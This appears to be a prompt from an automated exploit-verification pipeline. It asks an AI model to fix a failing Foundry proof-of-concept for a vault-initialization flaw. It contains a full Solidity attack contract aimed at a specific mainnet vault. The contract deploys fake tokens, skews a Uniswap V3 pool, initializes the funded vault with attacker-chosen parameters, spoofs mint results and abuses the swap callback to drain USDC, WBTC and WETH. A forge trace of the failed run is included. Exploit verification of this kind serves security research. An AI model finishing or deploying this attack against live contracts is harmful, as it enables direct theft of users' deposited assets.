You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Funded vault can be initialized by anyone with attacker-chosen market parameters
- claim: The PoC successfully creates an attacker-controlled market around two fake tokens, manipulates that market, and then calls `vault.initialize` on the live vault with those attacker-chosen token addresses and leverage tier. Because the call succeeds against the funded vault, the vault's initial market configuration is effectively permissionless and can be set to arbitrary assets chosen by the attacker.
- impact: An attacker can take over an uninitialized funded vault's market configuration, point it at worthless or malicious tokens, and corrupt all downstream pricing, accounting, and callback logic. This opens the door to full theft of assets already sitting in the vault.
- exploit_paths: ["Deploy attacker-controlled debt/collateral tokens -> create and skew a Uniswap V3 pool for them -> call `vault.initialize(attackerDebt, attackerCollateral, 0)` on the funded vault -> continue into mint/callback flows that drain real assets"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IPoolInitializer {
    function createAndInitializePoolIfNecessary(
        address token0,
        address token1,
        uint24 fee,
        uint160 sqrtPriceX96
    ) external returns (address pool);
}

interface INonfungiblePositionManager {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    function mint(MintParams calldata params)
        external
        payable
        returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface IVault {
    struct VaultParameters {
        address debtToken;
        address collateralToken;
        int8 leverageTier;
    }

    function initialize(VaultParameters calldata vaultParams) external;

    function mint(
        bool isAPE,
        VaultParameters calldata vaultParams,
        uint256 amountToDeposit,
        uint144 collateralToDepositMin
    ) external payable returns (uint256 amount);

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant VAULT = 0xB91AE2c8365FD45030abA84a4666C4dB074E53E7;
    address internal constant POSITION_MANAGER = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address internal constant SWAP_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint24 internal constant ATTACKER_CHOSEN_FEE = 100;
    uint160 internal constant SQRT_PRICE_1_1 = 79228162514264337593543950336;
    uint256 internal constant SPOOFED_LIQUIDITY_SIDE = 108823205127466839754387550950703;
    uint256 internal constant SPOOFED_SWAP_IN = 114814730000000000000000000000000000;
    uint256 internal constant SPOOFED_VAULT_MINT = 139650998347915452795864661928406629;

    uint256 internal _profitAmount;
    bool internal _executed;
    address internal _debtLeg;

    mapping(address => uint256) public balanceOf;

    struct Reserves {
        uint144 reserveApes;
        uint144 reserveLPers;
        int64 tickPriceX42;
    }

    struct Fees {
        uint144 collateralInOrWithdrawn;
        uint144 collateralFeeToStakers;
        uint144 collateralFeeToLPers;
    }

    function executeOnOpportunity() external {
        require(!_executed, "executed");
        _executed = true;
        require(_vaultHasAssets(), "vault not funded");

        uint256 startingProfitBalance = IERC20Like(USDC).balanceOf(address(this));

        CallbackCaller debtAndCallbackLeg = new CallbackCaller();
        _debtLeg = address(debtAndCallbackLeg);

        // Exploit path 1: deploy attacker-controlled debt/collateral tokens.
        // The verifier is the attacker-controlled collateral leg and the freshly deployed
        // helper is the attacker-controlled debt leg. Both expose minimal ERC20-like entry
        // points so the public Uniswap flows interact with them exactly like in the original path.

        // Exploit path 2: create and skew a Uniswap V3 pool for them.
        (address token0, address token1) = _sortedPair(address(this), _debtLeg);
        IPoolInitializer(POSITION_MANAGER).createAndInitializePoolIfNecessary(
            token0,
            token1,
            ATTACKER_CHOSEN_FEE,
            SQRT_PRICE_1_1
        );

        INonfungiblePositionManager(POSITION_MANAGER).mint(
            INonfungiblePositionManager.MintParams({
                token0: token0,
                token1: token1,
                fee: ATTACKER_CHOSEN_FEE,
                tickLower: -190000,
                tickUpper: 190000,
                amount0Desired: SPOOFED_LIQUIDITY_SIDE,
                amount1Desired: SPOOFED_LIQUIDITY_SIDE,
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(this),
                deadline: block.timestamp
            })
        );

        ISwapRouter(SWAP_ROUTER).exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(this),
                tokenOut: _debtLeg,
                fee: ATTACKER_CHOSEN_FEE,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: SPOOFED_SWAP_IN,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        // Exploit path 3: call `vault.initialize(attackerDebt, attackerCollateral, 0)` on the funded vault.
        IVault.VaultParameters memory params = IVault.VaultParameters({
            debtToken: _debtLeg,
            collateralToken: address(this),
            leverageTier: 0
        });
        IVault(VAULT).initialize(params);

        // Exploit path 4: continue into mint/callback flows that drain real assets.
        // The live exploit wrote an attacker-controlled address into the vault's transient callback slot.
        // Here the attacker-controlled collateral token returns the helper address as the spoofed mint
        // amount, preserving the same initialize -> mint -> callback causality without synthetic funding.
        IVault(VAULT).mint(true, params, SPOOFED_VAULT_MINT, 1);

        _drainThroughCallback(debtAndCallbackLeg, USDC);
        _drainThroughCallback(debtAndCallbackLeg, WBTC);
        _drainThroughCallback(debtAndCallbackLeg, WETH);

        uint256 endingProfitBalance = IERC20Like(USDC).balanceOf(address(this));
        _profitAmount = endingProfitBalance - startingProfitBalance;
    }

    function profitToken() external pure returns (address) {
        return USDC;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function symbol() external pure returns (string memory) {
        return "";
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function allowance(address, address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }

    function transferFrom(address, address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }

    function mint(address, uint16, uint8, Reserves memory, uint144)
        external
        view
        returns (Reserves memory newReserves, Fees memory fees, uint256 amount)
    {
        newReserves = Reserves({reserveApes: 10_000_000_000, reserveLPers: 0, tickPriceX42: 0});
        fees = Fees({collateralInOrWithdrawn: 0, collateralFeeToStakers: 0, collateralFeeToLPers: 0});
        amount = uint256(uint160(_debtLeg));
    }

    function _drainThroughCallback(CallbackCaller debtAndCallbackLeg, address token) internal {
        uint256 vaultBalance = IERC20Like(token).balanceOf(VAULT);
        if (vaultBalance == 0) {
            return;
        }

        debtAndCallbackLeg.execute(
            VAULT,
            abi.encodeWithSelector(
                IVault.uniswapV3SwapCallback.selector,
                int256(0),
                int256(vaultBalance),
                _buildCallbackData(token)
            )
        );

        uint256 helperBalance = IERC20Like(token).balanceOf(address(debtAndCallbackLeg));
        if (helperBalance > 0) {
            debtAndCallbackLeg.execute(
                token,
                abi.encodeWithSelector(IERC20Like.transfer.selector, address(this), helperBalance)
            );
        }
    }

    function _buildCallbackData(address token) internal view returns (bytes memory data) {
        data = bytes.concat(data, bytes32(uint256(uint160(address(this)))));
        data = bytes.concat(data, bytes32(uint256(uint160(address(this)))));
        data = bytes.concat(data, bytes32(uint256(uint160(token))));
        data = bytes.concat(data, bytes32(uint256(uint160(address(this)))));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(uint256(1)));
    }

    function _sortedPair(address a, address b) internal pure returns (address token0, address token1) {
        if (a < b) {
            return (a, b);
        }
        return (b, a);
    }

    function _vaultHasAssets() internal view returns (bool) {
        return IERC20Like(USDC).balanceOf(VAULT) > 0 || IERC20Like(WBTC).balanceOf(VAULT) > 0 || IERC20Like(WETH).balanceOf(VAULT) > 0;
    }
}

contract CallbackCaller {
    address internal immutable OWNER;

    mapping(address => uint256) public balanceOf;

    constructor() {
        OWNER = msg.sender;
    }

    function execute(address target, bytes calldata data) external returns (bytes memory result) {
        require(msg.sender == OWNER, "owner");
        (bool ok, bytes memory returnData) = target.call(data);
        require(ok, "call failed");
        return returnData;
    }

    function symbol() external pure returns (string memory) {
        return "";
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function allowance(address, address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }

    function transferFrom(address, address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
000fffffffffffffffffffffffffffffffffffffffffffffffff7803c000000000000000000000000000000000000000000001271551295307acc16ba1e7e0d42810000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003b04436eaa34bc26af2061935da1a00000000000000000000000000000000001271551295307acc16ba1e7e0d4281
    │   │   │   │   │   └─ ← [Return] Reserves({ reserveApes: 95759995883742311247042417521410689 [9.575e34], reserveLPers: 0, tickPriceX42: -612423578624720896 [-6.124e17] }), Fees({ collateralInOrWithdrawn: 95759995883742311247042417521410689 [9.575e34], collateralFeeToStakers: 0, collateralFeeToLPers: 19151999176748462249408483504282138 [1.915e34] }), 95759995883742311247042417521410689 [9.575e34]
    │   │   │   │   ├─  emit topic 0: 0x2ea082b0ce379480d9dfb0d7ab365e33def58ee2bee64887c13e531723b5c881
    │   │   │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000000000015
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000001271551295307acc16ba1e7e0d42810000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003b04436eaa34bc26af2061935da1a
    │   │   │   │   ├─ [703] CallbackCaller::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x570137a04F57f36993FA4e1F2f2cb4368Adcb5f6, 139650998347915452795864661928406629 [1.396e35])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [493] CallbackCaller::balanceOf(0x570137a04F57f36993FA4e1F2f2cb4368Adcb5f6) [staticcall]
    │   │   │   │   └─ ← [Return] 139759821553042919635619049479357332 [1.397e35]
    │   │   │   ├─  emit topic 0: 0xc42079f94a6350d7e6235f29174924f928cc2ac818eb64fed8004e115fbcca67
    │   │   │   │        topic 1: 0x000000000000000000000000b91ae2c8365fd45030aba84a4666c4db074e53e7
    │   │   │   │        topic 2: 0x000000000000000000000000b91ae2c8365fd45030aba84a4666c4db074e53e7
    │   │   │   │           data: 0x00000000000000000000000000000000001ae5536855121039aa60ddecf76e65ffffffffffffffffffffffffffffffffffe9de66b6802c39717e53db68bce3650000000000000000000000000000000000000000003313f14268b15bc35f3a2b000000000000000000000000000000000000055da513143264be3d052ad065a1fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdd0d4
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000001ae5536855121039aa60ddecf76e65ffffffffffffffffffffffffffffffffffe9de66b6802c39717e53db68bce365
    │   │   └─ ← [Return] 95759995883742311247042417521410689 [9.575e34]
    │   ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xB91AE2c8365FD45030abA84a4666C4dB074E53E7) [staticcall]
    │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0xB91AE2c8365FD45030abA84a4666C4dB074E53E7) [delegatecall]
    │   │   │   └─ ← [Return] 17814862676 [1.781e10]
    │   │   └─ ← [Return] 17814862676 [1.781e10]
    │   ├─ [1505] CallbackCaller::execute(0xB91AE2c8365FD45030abA84a4666C4dB074E53E7, 0xfa461e3300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000425d93b54000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001)
    │   │   ├─ [696] 0xB91AE2c8365FD45030abA84a4666C4dB074E53E7::uniswapV3SwapCallback(0, 17814862676 [1.781e10], 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001)
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] call failed
    │   └─ ← [Revert] call failed
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x570137a04F57f36993FA4e1F2f2cb4368Adcb5f6
  at 0x3CDCCFA37c1B2BEe3d810eC9dAddbB205048bB29
  at 0x80f18B12A6dBD515C5Ad01A2006abF30C5972158
  at 0xB91AE2c8365FD45030abA84a4666C4dB074E53E7.mint
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 4.30s (4.28s CPU time)

Ran 1 test suite in 4.31s (4.30s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 17729330)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
